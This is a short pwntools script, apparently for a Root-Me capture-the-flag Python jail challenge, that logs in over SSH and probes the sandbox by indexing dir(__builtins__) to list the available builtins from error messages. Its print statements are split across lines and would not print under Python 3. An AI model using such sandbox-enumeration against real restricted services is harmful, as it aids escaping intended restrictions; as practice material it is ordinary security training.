from pwn import *
import re

shell = ssh(host="challenge02.root-me.org", port=2222, user="app-script-ch10", password="app-script-ch10")
sh = shell.shell('')
# sh.sendline(b'hello')
# sh.recvline()  # wow! again, there's a file called flag.txt! insane!


def main():
    matches = []
    i = 0
    response = ""
    exc = ""
    while (exc.find("out of range") == -1):
        sh.sendline("int(dir(__builtins__)[%d])" % i)
        i = i + 1
        response = sh.recvline()  # Now it's ...
        exc = sh.recvline()  # Exception ...
        module = re.search(r"'(\w+)'", exc, re.M | re.I)

        if module:
            matches.append(module.group(1))
            print
            "New match: %s at index %d" % (module.group(1), i)

    print
    "finished"

    print
    ", ".join(matches)


try:
    main()
except Exception as e:
    print
    e